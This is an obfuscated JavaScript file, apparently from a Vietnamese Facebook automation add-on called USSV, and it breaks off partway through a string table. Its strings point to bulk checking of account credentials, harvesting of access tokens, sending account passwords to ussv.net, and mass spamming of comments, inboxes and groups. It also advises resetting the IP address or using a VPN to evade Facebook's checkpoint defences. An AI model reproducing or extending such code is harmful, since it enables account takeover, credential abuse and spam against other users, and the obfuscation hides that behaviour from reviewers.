var ussv_vs = "1.8";
xhr = new XMLHttpRequest();
xhr.open("GET", "https://ussv.net/addon/version.php", false);
xhr.send();
vs = JSON.parse(xhr.responseText);
nowvs = vs.Version;
note = vs.Note_Old;
if (nowvs !== ussv_vs) {
    var br = "<br/>";
    var btn_start_uss = '<div id="fb-root"></div>';
    btn_start_uss += '<div class="div_menu_uss oldvs" style="background: rgba(240, 248, 255, 0.09);">';
    btn_start_uss += '<div class="div_title" style="background: rgba(240, 248, 255, 0.09);">';
    btn_start_uss += '    <div class="clearfix">';
    btn_start_uss += '        <div>';
    btn_start_uss += '            <h3 style="font-size: 12px;color:#50659D">' + note + '</h3>';
    btn_start_uss += '        </div>';
    btn_start_uss += '    </div>';
    btn_start_uss += '</div>';
    btn_start_uss += '</div>';
    $("body").append(btn_start_uss)
    $("#pagelet_reminders").prepend(note);
    dem = 0
    hidenal = setInterval(function() {
        dem = dem + 1;
        if (dem == 4) {
            $(".oldvs").hide();
            clearInterval(hidenal);
        }
    }, 1000);
} else {
    var f1W = {
        'r7B': function(W, V) {
            return W == V;
        },
        'S3B': function(W, V) {
            return W !== V;
        },
        'q7b': function(W, V) {
            return W == V;
        },
        'j4v': "Không thê? tiê´n ha`nh Check da~ co´ lê?nh Du`ng Check !",
        'f36': function(W, V) {
            return W == V;
        },
        'Q80': "m7",
        'B6Y': ".ussv_fb_key",
        'H1X': "ThongKe",
        'K57': '">0</span><br/>',
        'J5a': "require",
        'U18': function(W, V) {
            return W == V;
        },
        'z5t': function(W, V) {
            return W == V;
        },
        'V46': function(W, V) {
            return W == V;
        },
        'c58': function(W, V) {
            return W == V;
        },
        'O2t': function(W, V) {
            return W == V;
        },
        'o27': "#uss_st_spam_time_inbox",
        'K3E': function(W, V) {
            return W !== V;
        },
        'S4E': function(W, V) {
            return W == V;
        },
        'S1v': "_",
        'n8v': "&one_click=false&source=2&client_id=1429015183656:1785788487&av=",
        'M8b': function(W, V) {
            return W !== V;
        },
        'v42': function(W, V) {
            return W == V;
        },
        'M4a': function(W, V) {
            return W == V;
        },
        'K0a': function(W, V) {
            return W == V;
        },
        'f3r': "t7",
        'Q8O': "|||",
        'X72': function(W, V) {
            return W !== V;
        },
        'n1B': function(W, V) {
            return W == V;
        },
        'h68': function(W, V) {
            return W < V;
        },
        'P8X': "a5",
        'f7y': "GetXS",
        'd18': function(W, V) {
            return W == V;
        },
        'l0v': "d",
        'p08': function(W, V) {
            return W == V;
        },
        'B6': function(W, V) {
            return W !== V;
        },
        'F4b': function(W, V) {
            return W == V;
        },
        's1O': "Ta`i khoa?n na`y Không Xa´c Ði?nh",
        'T7B': function(W, V) {
            return W == V;
        },
        'Y62': function(W, V) {
            return W == V;
        },
        'f47': "||xx||",
        'K7b': function(W, V) {
            return W == V;
        },
        'Z7': function(W) {
            ussv_lang_vi_rs_error_dietoken = W;
        },
        'S7l': function(W, V) {
            return W <= V;
        },
        'i88': function(W, V) {
            return W < V;
        },
        'y8B': function(W, V) {
            return W == V;
        },
        'Q4b': function(W, V) {
            return W == V;
        },
        'm5a': "#AccList_Laning_Note",
        'n0l': function(W, V) {
            return W !== V;
        },
        'f1y': "JoinGroup",
        'k7t': function(W, V) {
            return W == V;
        },
        'U52': function(W, V) {
            return W === V;
        },
        'Z18': function(W, V) {
            return W == V;
        },
        'F5B': function(W, V) {
            return W == V;
        },
        'U68': function(W, V) {
            return W == V;
        },
        'L9a': 0,
        'z9y': ".btn_open_group_tools",
        'a6E': function(W, V) {
            return W < V;
        },
        'U46': function(W, V) {
            return W * V;
        },
        'f6X': "N7",
        'k06': function(W, V) {
            return W == V;
        },
        'W58': function(W, V) {
            return W == V;
        },
        'v0b': function(W, V) {
            return W >= V;
        },
        'H8y': '"></textarea>',
        'I3r': '&',
        'r6E': function(W, V) {
            return W == V;
        },
        'G97': "href",
        'D9y': "Vui lo`ng Xo´a Cookie tri`nh Duyê?t, Sau Ðo´ Reset IP dê? tiê´p tu?c Su? Du?ng Tools<br/>Viê?c Check Sai Pass liên tu?c duo?c da´nh gia´ la` Nghiêm tro?ng Nhâ´t, chu´ng tôi câ`n ngan cha?n qua´ tri`nh na`y dê? tra´nh ti`nh tra?ng Sai Pass Ha`ng Loa?t !",
        'U1l': function(W, V) {
            return W == V;
        },
        'o20': "#GroupCore_spam_listid_blackgroup",
        'w2v': '			</div>',
        'j4l': function(W, V) {
            return W == V;
        },
        'F48': function(W, V) {
            return W == V;
        },
        'Q8r': 1000,
        'y1r': "https://facebook.com",
        'J9I': "CoBan",
        'J4a': function(W, V) {
            return W == V;
        },
        'w6': function(W, V) {
            return W == V;
        },
        'X0B': function(W, V) {
            return W === V;
        },
        't8Q': "rgb(147, 172, 232)",
        'P9B': function(W, V) {
            return W < V;
        },
        't4b': function(W, V) {
            return W < V;
        },
        'z80': 60,
        'b3B': function(W, V) {
            return W == V;
        },
        'K8r': "#total_check_fr",
        'm56': function(W, V) {
            return W == V;
        },
        'v9': function(W) {
            ussv_lang_vi_error_fl = W;
        },
        'L68': function(W, V) {
            return W < V;
        },
        'o4t': function(W, V) {
            return W !== V;
        },
        'N82': function(W, V) {
            return W !== V;
        },
        'i7X': "Spam",
        'z96': function(W, V) {
            return W < V;
        },
        'M87': "TK",
        'I42': function(W, V) {
            return W == V;
        },
        'A9I': 'https://graph.facebook.com/',
        'v4t': function(W, V) {
            return W == V;
        },
        't5X': "GetAcc",
        'i92': function(W, V) {
            return W <= V;
        },
        'M88': function(W, V) {
            return W >= V;
        },
        'V6Q': "attr",
        'F1a': function(W, V) {
            return W < V;
        },
        'Q8E': function(W, V) {
            return W !== V;
        },
        'k50': '        </div>',
        'p3t': function(W, V) {
            return W == V;
        },
        't5B': function(W, V) {
            return W == V;
        },
        'l9r': "https://ussv.net/ajax/get_fb_acc.php",
        'Z36': function(W, V) {
            return W !== V;
        },
        'q78': function(W, V) {
            return W == V;
        },
        'X8E': function(W, V) {
            return W < V;
        },
        'D9a': "#list_quyen_ppa",
        'N2X': " không thê? tiê´n ha`nh SPAM theo thiê´t lâ?p cu?a ba?n !",
        'S9y': "img",
        'v7y': "#Div_SpamCmt_TypeUSS",
        'C6Y': "input[name$='user']",
        'S5': function(W, V) {
            return W == V;
        },
        'U80': "https://www.facebook.com",
        'J28': function(W, V) {
            return W < V;
        },
        'd5v': "src",
        's62': function(W, V) {
            return W === V;
        },
        'H5r': "#thong_check_cp",
        'k5X': "#uss_auto_group",
        'H40': '&mabimat=',
        'i2O': "parse",
        'K7l': function(W, V) {
            return W > V;
        },
        'w6t': function(W, V) {
            return W == V;
        },
        'M8Q': "#uss_lan_saipass",
        'N3B': function(W, V) {
            return W <= V;
        },
        'U02': function(W, V) {
            return W == V;
        },
        'j9b': function(W, V) {
            return W !== V;
        },
        's50': "https://m.facebook.com/",
        'z1l': function(W, V) {
            return W < V;
        },
        'z0t': function(W, V) {
            return W !== V;
        },
        'x1X': "decode",
        'B06': function(W, V) {
            return W == V;
        },
        'E66': function(W, V) {
            return W === V;
        },
        'J3t': function(W, V) {
            return W < V;
        },
        'q6l': function(W, V) {
            return W == V;
        },
        'E6B': function(W, V) {
            return W == V;
        },
        's4l': function(W, V) {
            return W == V;
        },
        'k72': function(W, V) {
            return W == V;
        },
        'o92': function(W, V) {
            return W < V;
        },
        'r8b': function(W, V) {
            return W == V;
        },
        'k1t': function(W, V) {
            return W == V;
        },
        'G8l': function(W, V) {
            return W == V;
        },
        'g7t': function(W, V) {
            return W < V;
        },
        'B62': function(W, V) {
            return W == V;
        },
        'M3': function(W, V) {
            return W !== V;
        },
        'C6': function(W, V) {
            return W == V;
        },
        'W92': function(W, V) {
            return W < V;
        },
        'v4a': function(W, V) {
            return W == V;
        },
        'F7r': "|_|_|error|check",
        'u42': function(W, V) {
            return W == V;
        },
        'g97': ".ussv_safe_cancel.",
        'b4B': function(W, V) {
            return W >= V;
        },
        'I4a': function(W, V) {
            return W == V;
        },
        'm6t': function(W, V) {
            return W == V;
        },
        't7': function(W, V) {
            return W !== V;
        },
        'u3': function(W, V) {
            return W == V;
        },
        'W6Y': ".conversation",
        'J20': "Help: Ðê? da?t tha`nh Email chi´nh, yêu câ`u Email chuâ?n bi? thao ta´c pha?i duo?c ki´ch hoa?t sa~n trên ta`i khoa?n na`y.",
        'a7I': "login",
        'F60': "#addon_div_login",
        'z6l': function(W, V) {
            return W == V;
        },
        'R8': function(W, V) {
            return W == V;
        },
        's56': function(W, V) {
            return W === V;
        },
        'R30': false,
        'X86': function(W, V) {
            return W == V;
        },
        'h8y': "Vu`a hoa`n tha`nh Xo´a toa`n bô? Cookie vi` co´ 1 ta`i khoa?n bi? Checkpoint !",
        'M8l': function(W, V) {
            return W == V;
        },
        'z10': "Hmmm. Tôi da~ câ´p la?i quyê`n Spam trên ta`i khoa?n cho ba?n. Ha~y cha´c cha´n ra`ng nô?i dung da~ thay dô?i dê? tra´nh bi? FB ba´o lô~i nu~a nhe´ !!!",
        'u16': function(W, V) {
            return W == V;
        },
        'k8Q': ".class_viewimg",
        'e2b': function(W, V) {
            return W == V;
        },
        'I32': function(W, V) {
            return W !== V;
        },
        'I8y': "#uss_logs_spam_hidde",
        'K18': function(W, V) {
            return W == V;
        },
        'j80': 75,
        'h7y': ".div_Laning_AccList.Token",
        'V2Q': "&type=",
        'n40': "floor",
        'c2b': function(W, V) {
            return W < V;
        },
        'P0t': function(W, V) {
            return W !== V;
        },
        'E08': function(W, V) {
            return W - V;
        },
        'i3X': "#uss_st_auto_keomem_limit",
        'b7l': function(W, V) {
            return W > V;
        },
        'e9t': function(W, V) {
            return W == V;
        },
        'u4t': function(W, V) {
            return W !== V;
        },
        'y1t': function(W, V) {
            return W == V;
        },
        'M7O': " | ",
        'A7Q': "#uss_st_Id_Sub",
        'e92': function(W, V) {
            return W !== V;
        },
        'n4v': "cmt",
        'R9E': function(W, V) {
            return W == V;
        },
        'y38': function(W, V) {
            return W == V;
        },
        'k12': function(W, V) {
            return W == V;
        },
        'c77': "#uss_saipass",
        'c1B': function(W, V) {
            return W <= V;
        },
        'S36': function(W, V) {
            return W < V;
        },
        'l6Q': "fadeIn",
        'x4y': "&token=",
        'a5l': function(W, V) {
            return W == V;
        },
        'n7E': function(W, V) {
            return W == V;
        },
        'A50': "#uss_checkpoint",
        'W8O': "createElement",
        'd7l': function(W, V) {
            return W == V;
        },
        'R7l': function(W, V) {
            return W <= V;
        },
        'c4I': "email",
        'O47': "FB Key or Uid không tô`n ta?i, không thê? u?y quyê`n dê? thao ta´c.",
        'P6I': "Hiê?n Ta`i Khoa?n truo´c la` toa`n khoa?n thu´ ",
        'P2t': function(W, V) {
            return W == V;
        },
        'y3X': "Không thê? lâ´y thiê´t lâ?p Spam trên ta`i khoa?n cu?a ba?n !",
        'J6E': function(W, V) {
            return W == V;
        },
        'E92': function(W, V) {
            return W == V;
        },
        'q52': function(W, V) {
            return W == V;
        },
        'j3b': function(W, V) {
            return W !== V;
        },
        't70': 70,
        'I2r': "#uss_can_spam",
        'L18': function(W, V) {
            return W == V;
        },
        'i42': function(W, V) {
            return W == V;
        },
        'L2Y': "Ðang tiê´n ha`nh truy câ?p nhanh ta`i khoa?n ",
        's2E': function(W, V) {
            return W == V;
        },
        'H9E': function(W, V) {
            return W == V;
        },
        'Z7Y': "USS CHECK râ´t hân ha?nh duo?c phu?c vu? ba?n ! USSV dang tiê´n ha`nh xa´c minh ta`i khoa?n ",
        'k4b': function(W, V) {
            return W == V;
        },
        'p4a': function(W, V) {
            return W * V;
        },
        'p0O': "status",
        'Z9y': "created_time",
        'x4l': function(W, V) {
            return W == V;
        },
        'b6l': function(W, V) {
            return W == V;
        },
        'N5t': function(W, V) {
            return W == V;
        },
        'p37': "spam",
        'b7': function(W) {
            ussv_lang_vi_vl_pt_minimum_c = W;
        },
        'O36': function(W, V) {
            return W == V;
        },
        'H2t': function(W, V) {
            return W == V;
        },
        'U7v': "||",
        'J1v': '		',
        'B9l': function(W, V) {
            return W <= V;
        },
        'n4t': function(W, V) {
            return W == V;
        },
        'J2I': "#sl_CustomJS",
        'g4Q': "(.*?).com",
        'd1l': function(W, V) {
            return W > V;
        },
        'D60': "readyState",
        'V5r': "NoiDung",
        'X2E': function(W, V) {
            return W == V;
        },
        't9l': function(W, V) {
            return W >= V;
        },
        'h5t': function(W, V) {
            return W == V;
        },
        'B56': function(W, V) {
            return W < V;
        },
        'o0l': function(W, V) {
            return W >= V;
        },
        'D4r': "ussv_USSVHome_HideForever",
        'R0a': function(W, V) {
            return W == V;
        },
        'W16': function(W, V) {
            return W !== V;
        },
        'D3b': function(W, V) {
            return W !== V;
        },
        'n5I': "</span>",
        'e7B': function(W, V) {
            return W - V;
        },
        'w26': function(W, V) {
            return W == V;
        },
        'C7Q': "<span style='color: rgb(242, 21, 55);'>Ðang nhâ?p thâ´t ba?i, Mâ?t khâ?u không du´ng, co´ thê? da~ bi? thay dô?i...",
        'U3E': function(W, V) {
            return W == V;
        },
        't6t': function(W, V) {
            return W !== V;
        },
        'B1v': "#uss_st_cmt_post_group",
        'P0r': '<br/>',
        'L7v': ".icon_code",
        'Y9I': "Aut",
        'l97': "uid",
        'T76': function(W, V) {
            return W == V;
        },
        'w2B': function(W, V) {
            return W !== V;
        },
        'O9Q': "/",
        'Z7b': function(W, V) {
            return W == V;
        },
        'C4l': function(W, V) {
            return W == V;
        },
        'Z9B': function(W, V) {
            return W >= V;
        },
        'U36': function(W, V) {
            return W == V;
        },
        'M9X': "a7",
        'r32': function(W, V) {
            return W !== V;
        },
        'X4X': "0|_|_|error|check",
        'i3a': "ImgId",
        'q18': function(W, V) {
            return W < V;
        },
        'A1B': function(W, V) {
            return W == V;
        },
        'G6B': function(W, V) {
            return W == V;
        },
        'R36': function(W, V) {
            return W < V;
        },
        'I0b': function(W, V) {
            return W >= V;
        },
        'R1b': function(W, V) {
            return W == V;
        },
        'M9t': function(W, V) {
            return W > V;
        },
        'a8b': function(W, V) {
            return W !== V;
        },
        'W3v': 'application/x-www-form-urlencoded',
        'p97': "#uss_st_check_group",
        'u76': function(W, V) {
            return W == V;
        },
        'W3O': "Ba?n duo?c u?y quyê`n truy câ?p va` thao ta´c !",
        'X8O': "#stt_checking",
        'p77': '" src="https://ussv.net/themes/img/app/icon_login.png">',
        'J7E': function(W, V) {
            return W == V;
        },
        'p5X': "192.168.1",
        'Q26': function(W, V) {
            return W == V;
        },
        'e7': function(W) {
            ussv_lang_vi_vl_pt_hight_die = W;
        },
        'E32': function(W, V) {
            return W < V;
        },
        'L7l': function(W, V) {
            return W == V;
        },
        'Q5E': function(W, V) {
            return W == V;
        },
        'o07': "val",
        'L9': function(W) {
            ussv_lang_vi_fn_fl = W;
        },
        'L22': function(W, V) {
            return W == V;
        },
        'e9y': 'Xo´a tha`nh công Ta`i Khoa?n',
        'E3r': "#st_CustomJs_Url",
        'd8t': function(W, V) {
            return W == V;
        },
        'B4b': function(W, V) {
            return W !== V;
        },
        'T42': function(W, V) {
            return W == V;
        },
        'm90': 'div',
        't7t': function(W, V) {
            return W == V;
        },
        'G2b': function(W, V) {
            return W !== V;
        },
        'E3': function(W, V) {
            return W == V;
        },
        'z02': function(W, V) {
            return W == V;
        },
        'Y8E': function(W, V) {
            return W == V;
        },
        'Q38': function(W, V) {
            return W == V;
        },
        'i58': function(W, V) {
            return W == V;
        },
        'k26': function(W, V) {
            return W == V;
        },
        's3b': function(W, V) {
            return W == V;
        },
        'H68': function(W, V) {
            return W == V;
        },
        'c5l': function(W, V) {
            return W > V;
        },
        'c1Y': "&time_add=",
        'B86': function(W, V) {
            return W !== V;
        },
        'g48': function(W, V) {
            return W !== V;
        },
        'R0y': "App",
        'V1l': function(W, V) {
            return W === V;
        },
        'F5E': function(W, V) {
            return W == V;
        },
        'S22': function(W, V) {
            return W == V;
        },
        't8B': function(W, V) {
            return W == V;
        },
        'Y6t': function(W, V) {
            return W === V;
        },
        'o3': function(W, V) {
            return W !== V;
        },
        'o9Y': "base64",
        'N3Q': "#checking_sub_",
        'D4b': function(W, V) {
            return W == V;
        },
        'e7E': function(W, V) {
            return W == V;
        },
        'P68': function(W, V) {
            return W < V;
        },
        'S78': function(W, V) {
            return W == V;
        },
        'm6Q': '<div class="InfoGroup">',
        'R5t': function(W, V) {
            return W !== V;
        },
        'W6O': "success",
        'O4B': function(W, V) {
            return W == V;
        },
        'W1r': '		<img title="Ðang Nhâ?p Nhanh Ta`i Khoa?n ',
        'r8v': "&fb_dtsg=",
        'I3': function(W, V) {
            return W !== V;
        },
        'k1a': function(W, V) {
            return W == V;
        },
        'Q6': function(W, V) {
            return W == V;
        },
        'S2O': "Tiê´n ha`nh lâ´y thiê´t lâ?p dê? tiê´n ha`nh spam trên ta`i khoa?n: ",
        'P37': "span",
        'F0E': function(W, V) {
            return W == V;
        },
        'r92': function(W, V) {
            return W == V;
        },
        'i7E': function(W, V) {
            return W < V;
        },
        'r1E': function(W, V) {
            return W == V;
        },
        'c9a': 2,
        'f3B': function(W, V) {
            return W == V;
        },
        't0B': function(W, V) {
            return W == V;
        },
        'k9Y': "int",
        'h0r': "send",
        'C1a': function(W, V) {
            return W == V;
        },
        'S00': "Load",
        'R7': function(W) {
            ussv_lang_vi_vl_pt_sp_h90 = W;
        },
        'w5E': function(W, V) {
            return W == V;
        },
        's7O': "toString",
        'a66': function(W, V) {
            return W == V;
        },
        'H5': function(W, V) {
            return W == V;
        },
        'V67': "0|0|_|error|autoAddGr",
        'W5b': function(W, V) {
            return W == V;
        },
        'x8E': function(W, V) {
            return W !== V;
        },
        'y5Q': "_uss",
        'y1a': function(W, V) {
            return W >= V;
        },
        'I8Q': "No",
        'a16': function(W, V) {
            return W !== V;
        },
        'J1B': function(W, V) {
            return W > V;
        },
        'v7E': function(W, V) {
            return W === V;
        },
        'Q0Q': '" style="position: absolute;left: 80%;"><img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif"></span></div><span id="acc_fn_pass_',
        'M3t': function(W, V) {
            return W == V;
        },
        'e9I': "#uss_st_auto_keomem",
        'Y6v': "getMinutes",
        'o5b': function(W, V) {
            return W == V;
        },
        'N8t': function(W, V) {
            return W == V;
        },
        'U4E': function(W, V) {
            return W == V;
        },
        'R6I': '<span class="css-tooltip-left color-fb">',
        'l98': function(W, V) {
            return W * V;
        },
        'o6O': "mobile_phone",
        'h82': function(W, V) {
            return W == V;
        },
        'A58': function(W, V) {
            return W == V;
        },
        'f0y': '" class="hiden_div" src="https://ussv.net/themes/img/hiden_div.png"></a>',
        'D56': function(W, V) {
            return W == V;
        },
        'L8I': "http://fb.com",
        'x98': function(W, V) {
            return W >= V;
        },
        'I08': function(W, V) {
            return W == V;
        },
        'm4l': function(W, V) {
            return W !== V;
        },
        'y3r': 'Vu`a Lâ´y danh sa´ch Lo?c Acc...',
        'J2l': function(W, V) {
            return W >= V;
        },
        'w48': function(W, V) {
            return W <= V;
        },
        'A7B': function(W, V) {
            return W == V;
        },
        'M5b': function(W, V) {
            return W == V;
        },
        'H3X': "I3t",
        'x7t': function(W, V) {
            return W == V;
        },
        'y86': function(W, V) {
            return W < V;
        },
        'f3E': function(W, V) {
            return W == V;
        },
        'z00': "#uss_st_check_rename",
        'i37': "#spam_vl_",
        'O4y': "type",
        'Y4X': "Lâ´y List Acc",
        'h02': function(W, V) {
            return W == V;
        },
        'm6': function(W, V) {
            return W == V;
        },
        'q07': "preventDefault",
        'W1E': function(W, V) {
            return W == V;
        },
        'G2l': function(W, V) {
            return W > V;
        },
        'A0y': "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 5000&access_token=",
        'Y5v': "l",
        'D9l': function(W, V) {
            return W > V;
        },
        'e6E': function(W, V) {
            return W == V;
        },
        'i0Y': "group",
        'r2l': function(W, V) {
            return W >= V;
        },
        'n2y': "#GroupCore_spam_sl_UseVPN",
        'A9t': function(W, V) {
            return W == V;
        },
        'e3v': "<span style='color: rgb(242, 21, 55);'>Ðang nhâ?p thâ´t ba?i, Ta`i Khoa?n bi? CheckPoint...",
        'X6': function(W, V) {
            return W !== V;
        },
        'A3t': function(W, V) {
            return W !== V;
        },
        'b4I': "#uss_st_type_internet_auto_rs_per",
        'g06': function(W, V) {
            return W == V;
        },
        'S2a': function(W, V) {
            return W >= V;
        },
        'z18': function(W, V) {
            return W == V;
        },
        'M76': function(W, V) {
            return W == V;
        },
        'z36': function(W, V) {
            return W < V;
        },
        'V4y': "cp",
        'd5y': "open",
        'g0X': "Qu´a tri`nh Check ",
        'X5v': "done",
        'Y0r': "Ta`i Khoa?n ",
        'Y5E': function(W, V) {
            return W <= V;
        },
        'K2a': function(W, V) {
            return W == V;
        },
        'W7a': 8,
        'f4Q': "#uss_st_check_savecoookie",
        'X06': function(W, V) {
            return W == V;
        },
        'M92': function(W, V) {
            return W > V;
        },
        'B6I': "Invite",
        'G0v': "domops",
        't6y': "VPNBrowsec",
        'N02': function(W, V) {
            return W == V;
        },
        'y0r': "fb_dob",
        'g0B': function(W, V) {
            return W == V;
        },
        'n7B': function(W, V) {
            return W == V;
        },
        'c60': "GetToken",
        'c8b': function(W, V) {
            return W !== V;
        },
        'q8t': function(W, V) {
            return W == V;
        },
        'd4Y': "https://www.facebook.com/ajax/hovercard/group.php?id=",
        'J76': function(W, V) {
            return W == V;
        },
        'o32': function(W, V) {
            return W !== V;
        },
        'v2O': "#spam_info_acc_can_spam_",
        'Y5a': 500,
        'Z3B': function(W, V) {
            return W !== V;
        },
        'S4Y': "#thong_check_die, #thongke_acc_die",
        'T4O': "CustomVPN",
        'B0B': function(W, V) {
            return W == V;
        },
        'G8I': "&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&public_info_nux=1&private=&login=&read=",
        'S46': function(W, V) {
            return W !== V;
        },
        'v6B': function(W, V) {
            return W / V;
        },
        'g9y': "https://www.facebook.com/settings/applications/typeahead?value=stellar&existing_ids=&__user=",
        'v32': function(W, V) {
            return W == V;
        },
        'Q27': "http://",
        'c2l': function(W, V) {
            return W < V;
        },
        'b4E': function(W, V) {
            return W > V;
        },
        'W8l': function(W, V) {
            return W < V;
        },
        'm7t': function(W, V) {
            return W !== V;
        },
        'U8Y': "LoadHtml",
        'k62': function(W, V) {
            return W == V;
        },
        'I0l': function(W, V) {
            return W < V;
        },
        'T2b': function(W, V) {
            return W < V;
        },
        'M0b': function(W, V) {
            return W !== V;
        },
        'm1a': function(W, V) {
            return W == V;
        },
        'i5b': function(W, V) {
            return W !== V;
        },
        'd3B': function(W, V) {
            return W == V;
        },
        'g9b': function(W, V) {
            return W == V;
        },
        'S1l': function(W, V) {
            return W == V;
        },
        'M4I': "actions",
        'u8v': "gif_id",
        'B2B': function(W, V) {
            return W > V;
        },
        'Q1I': "background",
        'Y38': function(W, V) {
            return W > V;
        },
        'r4a': function(W, V) {
            return W == V;
        },
        'y4Q': "USSV da~ co´ 1 ca´i nhi`n va` da´nh gia´ vê` tiê´n tri`nh check cu?a ba?n.",
        'Y8B': function(W, V) {
            return W == V;
        },
        'i5X': '|',
        'f82': function(W, V) {
            return W == V;
        },
        'N1b': function(W, V) {
            return W == V;
        },
        'm8B': function(W, V) {
            return W == V;
        },
        'e1E': function(W, V) {
            return W < V;
        },
        'e90': 15,
        'E76': function(W, V) {
            return W == V;
        },
        'e7Y': "Yêu c?u th?t b?i !",
        'J32': function(W, V) {
            return W !== V;
        },
        'u5X': 'mabimat',
        'e3': function(W, V) {
            return W !== V;
        },
        'L0Q': "off",
        'n6E': function(W, V) {
            return W == V;
        },
        'a9X': ".SettingLike",
        'e32': function(W, V) {
            return W == V;
        },
        'A00': "b5",
        'b8Y': "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$",
        'b4Q': ".ussv_log_panel.setting.langing",
        'P4E': function(W, V) {
            return W !== V;
        },
        'W8X': 'select',
        'p90': 17,
        'u08': function(W, V) {
            return W == V;
        },
        'y60': "#note_check_info",
        'V2X': "fromCharCode",
        'r1B': function(W, V) {
            return W == V;
        },
        'j4Y': "O8",
        'n3t': function(W, V) {
            return W == V;
        },
        's6t': function(W, V) {
            return W == V;
        },
        'Z02': function(W, V) {
            return W == V;
        },
        'm3r': "ussv_sl_ussv_auto_login",
        'T3': function(W, V) {
            return W == V;
        },
        't2E': function(W, V) {
            return W == V;
        },
        'O8t': function(W, V) {
            return W > V;
        },
        'O46': function(W, V) {
            return W > V;
        },
        'u0O': 100,
        'T8y': "#btn_stop_c_logs_ussv",
        'X00': "Vu`a tiê´n ha`nh xo´a Tin nha´n trong ho?p thu dê´n...",
        'v9t': function(W, V) {
            return W == V;
        },
        'C5B': function(W, V) {
            return W !== V;
        },
        'V7': function(W) {
            ussv_lang_vi_cant_get_st_sp = W;
        },
        'I76': function(W, V) {
            return W == V;
        },
        'B3l': function(W, V) {
            return W == V;
        },
        'L02': function(W, V) {
            return W == V;
        },
        'Z00': "219885578217768",
        'J8b': function(W, V) {
            return W == V;
        },
        'H1b': function(W, V) {
            return W == V;
        },
        'H8t': function(W, V) {
            return W * V;
        },
        'h3B': function(W, V) {
            return W >= V;
        },
        'v0y': "#thong_check_cp, #thongke_acc_cp",
        'T2l': function(W, V) {
            return W == V;
        },
        'o6E': function(W, V) {
            return W >= V;
        },
        'U7b': function(W, V) {
            return W == V;
        },
        'w06': function(W, V) {
            return W < V;
        },
        'v7Q': "|_|_|ok|check",
        'P1l': function(W, V) {
            return W - V;
        },
        'h8': function(W, V) {
            return W == V;
        },
        'b52': function(W, V) {
            return W == V;
        },
        'K1I': "check",
        'u4X': "a1",
        't38': function(W, V) {
            return W == V;
        },
        'Z5t': function(W, V) {
            return W == V;
        },
        'w5B': function(W, V) {
            return W != V;
        },
        'A66': function(W, V) {
            return W < V;
        },
        'd46': function(W, V) {
            return W !== V;
        },
        'd7a': 'cancel_clicked',
        'c92': function(W, V) {
            return W < V;
        },
        'w38': function(W, V) {
            return W == V;
        },
        'A9a': 9,
        'X3Q': "split",
        'Y4Q': "input[name$='Login_Name']",
        'J16': function(W, V) {
            return W == V;
        },
        'Y6Q': 'GET',
        'G9O': '<a><img id="hide_div_viewimg_',
        'N37': "Co´ vâ´n dê` vo´i List Ta`i Khoa?n cu?a ba?n, co´ râ´t nhiê`u nguyên nhân dâ~n dê´n ti`nh tra?ng Checkpoint. Ba?n vui lo`ng kiê?m tra la?i List Acc truo´c khi tiê´n ha`nh Check !",
        'i32': function(W, V) {
            return W !== V;
        },
        'E5v': "#thongke_fbchuacheck",
        'V8v': "",
        'R6Q': "#uss_st_clearbrower",
        'H57': 'undefined',
        'g56': function(W, V) {
            return W == V;
        },
        'T8b': function(W, V) {
            return W !== V;
        },
        'f18': function(W, V) {
            return W == V;
        },
        'L6I': "#btn_start_c_logs_ussv",
        'a2l': function(W, V) {
            return W - V;
        },
        'F4y': "#GroupCore_spam_TypeUSS_Data",
        'k86': function(W, V) {
            return W == V;
        },
        'e0l': function(W, V) {
            return W == V;
        },
        'k9b': function(W, V) {
            return W == V;
        },
        'P82': function(W, V) {
            return W !== V;
        },
        'V22': function(W, V) {
            return W !== V;
        },
        'F98': function(W, V) {
            return W == V;
        },
        'e87': ".InfoGroup",
        'T4a': function(W, V) {
            return W == V;
        },
        'H7a': "c2",
        'B3b': function(W, V) {
            return W < V;
        },
        't5E': function(W, V) {
            return W !== V;
        },
        'S9B': function(W, V) {
            return W == V;
        },
        'T0b': function(W, V) {
            return W < V;
        },
        'q22': function(W, V) {
            return W !== V;
        },
        'B48': function(W, V) {
            return W == V;
        },
        'p76': function(W, V) {
            return W == V;
        },
        'd9a': 4,
        'f46': function(W, V) {
            return W < V;
        },
        'd36': function(W, V) {
            return W === V;
        },
        'H52': function(W, V) {
            return W < V;
        },
        'X0v': "Max_Invite",
        'R2t': function(W, V) {
            return W == V;
        },
        'a80': "...",
        'w4b': function(W, V) {
            return W - V;
        },
        'b02': function(W, V) {
            return W == V;
        },
        'G1y': "rgba(38, 181, 7, 0.42)",
        'u2l': function(W, V) {
            return W >= V;
        },
        'd0v': '<div class="div_them_acc">',
        'a7B': function(W, V) {
            return W == V;
        },
        'H90': 13,
        'h2': function(W) {
            lang_vi_st_check_note_timeadd = W;
        },
        'Y6': function(W, V) {
            return W !== V;
        },
        'D8B': function(W, V) {
            return W == V;
        },
        'g98': function(W, V) {
            return W >= V;
        },
        'g0E': function(W, V) {
            return W == V;
        },
        'G4I': "Ta`i khoa?n na`y bi? CHECKPOINT",
        'b96': function(W, V) {
            return W == V;
        },
        'g86': function(W, V) {
            return W == V;
        },
        'b68': function(W, V) {
            return W == V;
        },
        'O6l': function(W, V) {
            return W === V;
        },
        'N3E': function(W, V) {
            return W == V;
        },
        'o9Q': 200,
        'P20': '&__CONFIRM__=1',
        's8E': function(W, V) {
            return W == V;
        },
        'S5v': "<center>",
        'N96': function(W, V) {
            return W == V;
        },
        'D9r': '<option value="',
        'o66': function(W, V) {
            return W > V;
        },
        'm5E': function(W, V) {
            return W == V;
        },
        'e28': function(W, V) {
            return W == V;
        },
        'B7t': function(W, V) {
            return W == V;
        },
        'f2Q': '"></span>',
        'u5b': function(W, V) {
            return W == V;
        },
        'G2r': "post_id",
        'm2Q': "getHours",
        'a7y': "Note",
        'p32': function(W, V) {
            return W == V;
        },
        'I1B': function(W, V) {
            return W - V;
        },
        'Y9l': function(W, V) {
            return W == V;
        },
        'q36': function(W, V) {
            return W == V;
        },
        'i2y': "*|*",
        'p92': function(W, V) {
            return W == V;
        },
        'h3O': "&endpoint=/ajax/hovercard/group.php?id=",
        'P3r': 'fb_dtsg',
        'm7': function(W) {
